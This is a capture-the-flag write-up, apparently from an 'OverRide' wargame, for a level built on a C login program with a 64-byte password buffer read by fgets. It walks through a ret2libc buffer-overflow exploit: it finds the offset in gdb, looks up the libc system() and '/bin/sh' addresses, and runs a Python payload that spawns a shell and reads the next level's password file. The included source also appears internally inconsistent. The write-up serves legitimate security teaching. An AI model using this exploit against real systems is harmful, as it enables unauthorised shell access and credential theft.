# Level 01

<h3>source.c</h3>

```console
char a_user_name[100];

int verify_user_name(void) {
    puts("verifying username....\n");
    return strncmp(a_user_name, "dat_wil", 7);
}

int verify_user_pass(char *pass) {
    return strncmp(pass, "admin", 5);
}

int main() {
  char    pass[64] = { };
  int     check = 0;

  memset(str, 0, 64);
  puts("********* ADMIN LOGIN PROMPT *********");
  printf("Enter Username: ");
  fgets(a_user_name, 256, stdin);
  check = verify_user_name();
  if (check != 0) {
    puts("nope, incorrect username...\n");
    return (1);
  }
  puts("Enter Password: ");
  fgets(pass, 100, stdin);
  check = verify_user_pass(pass);
  if (check == 0) {
    puts("nope, incorrect password...\n");
    return (1);
  }
  if (check == 0)
    return (0);
}
```

<h3>Analysis</h3>

Base on the program, we will be expecting to input an `username` and `password`, we can see that the `username` shoule be equal to `dat_wil` and `password` is `admin`

However, even if we have both of them correct, the end program will not give us any shell. We could spawn a shell by using`ret2libc` exploit

There is no vulnerable function here that we can exploit, but we can see that the `pass` only have `64 bytes` buffer, while the `fgets()` are reading up to `100 bytes`

This give us and extra `36 bytes` that we can try to use to overflow and overwrite the return address

<h3>Exploit</h3>

First we need to find the offset on where we could overwrite the return address

```console
(gdb) r

Starting program: /home/users/level01/level01
********* ADMIN LOGIN PROMPT *********
Enter Username: dat_wil
verifying username....

Enter Password:
AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUU
nope, incorrect password...


Program received signal SIGSEGV, Segmentation fault.
0x55555555 in ?? ()
```

We can see that with offset `80` we could overwrite the return address

Next we need to find the address `system()` and `"/bin/sh` from the `libc`

```console
(gdb) p system
$1 = {<text variable, no debug info>} 0xf7e6aed0 <system>
(gdb) find 0xf7e2c000, +0x1a0000, "/bin/sh"
0xf7f897ec
1 pattern found.
```

Now will be the time to test our exploit

```console
level01@OverRide:~$ (python -c "print 'dat_wil\n' + 'a' * 80 + '\xd0\xae\xe6\xf7' + 'bbbb' + '\xec\x97\xf8\xf7'"; cat - ) | ./level01
********* ADMIN LOGIN PROMPT *********
Enter Username: verifying username....

Enter Password:
nope, incorrect password...

whoami
level02
cat /home/users/level02/.pass
PwBLgNa8p8MTKW57S7zxVAQCxnCpV8JqTTs9XEBv
```
